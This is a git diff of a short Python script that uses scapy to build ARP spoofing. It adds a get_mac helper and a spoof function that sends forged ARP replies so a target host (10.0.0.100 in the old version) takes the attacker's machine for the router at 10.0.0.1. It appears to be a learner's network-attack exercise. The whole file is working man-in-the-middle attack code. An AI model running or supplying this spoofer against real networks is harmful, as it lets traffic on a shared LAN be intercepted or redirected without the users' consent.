@@ -1,9 +1,23 @@
 import scapy.all as scapy
-#  op1 is for request, op2 is for response
-# pdst is the target ip address
-# hwdst is the target mac address
-# psrc is the source ip address which I set to router ip address
-packet = scapy.ARP(op=2, pdst="10.0.0.100", hwdst="68:1d:ef:39:7a:9e", psrc="10.0.0.1")
-# print(packet.show())
-# print(packet.summary())
-scapy.send(packet)
+
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    combined_packet = broadcast/arp_request
+    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
+    print(answered_list[0][1].hwsrc)
+    return answered_list[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    # op1 is for request, op2 is for response
+    # pdst is the target ip address
+    # hwdst is the target mac address
+    # psrc is the source ip address which I set to router ip address
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet)
+
+
+get_mac("10.0.0.1")
